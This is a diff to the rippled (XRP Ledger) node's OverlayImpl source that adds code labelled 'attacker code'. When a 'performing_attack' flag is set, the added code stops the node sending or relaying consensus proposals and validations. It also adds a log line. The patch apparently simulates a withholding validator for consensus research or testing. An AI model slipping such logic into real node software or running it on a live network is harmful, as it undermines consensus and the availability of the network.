@@ -17,6 +17,10 @@
 */
 //==============================================================================
 
+// Start attacker code
+// used to know value 'performing_attack'
+#include <ripple/app/main/Application.h>
+// End attacker code
 #include <ripple/app/ledger/LedgerMaster.h>
 #include <ripple/app/misc/HashRouter.h>
 #include <ripple/app/misc/NetworkOPs.h>
@@ -1105,9 +1109,14 @@ OverlayImpl::findPeerByPublicKey (PublicKey const& pubKey)
 void
 OverlayImpl::send (protocol::TMProposeSet& m)
 {
+    // Start attacker code
+    if (performing_attack)
+        return;
+    // End attacker code
     if (setup_.expire)
         m.set_hops(0);
     auto const sm = std::make_shared<Message>(m, protocol::mtPROPOSE_LEDGER);
+    JLOG(journal_.warn()) << "OverlayImpl::send: sending proposal: " << sm;
     for_each([&](std::shared_ptr<PeerImp>&& p)
     {
         p->send(sm);
@@ -1116,6 +1125,10 @@ OverlayImpl::send (protocol::TMProposeSet& m)
 void
 OverlayImpl::send (protocol::TMValidation& m)
 {
+    // Start attacker code
+    if (performing_attack)
+        return;
+    // End attacker code
     if (setup_.expire)
         m.set_hops(0);
     auto const sm = std::make_shared<Message>(m, protocol::mtVALIDATION);
@@ -1137,6 +1150,10 @@ OverlayImpl::send (protocol::TMValidation& m)
 void
 OverlayImpl::relay (protocol::TMProposeSet& m, uint256 const& uid)
 {
+    // Start attacker code
+    if (performing_attack)
+        return;
+    // End attacker code
     if (m.has_hops() && m.hops() >= maxTTL)
         return;
     if (auto const toSkip = app_.getHashRouter().shouldRelay(uid))
@@ -1156,6 +1173,10 @@ OverlayImpl::relay (protocol::TMProposeSet& m, uint256 const& uid)
 void
 OverlayImpl::relay (protocol::TMValidation& m, uint256 const& uid)
 {
+    // Start attacker code
+    if (performing_attack)
+        return;
+    // End attacker code
     if (m.has_hops() && m.hops() >= maxTTL)
         return;
     if (auto const toSkip = app_.getHashRouter().shouldRelay(uid))
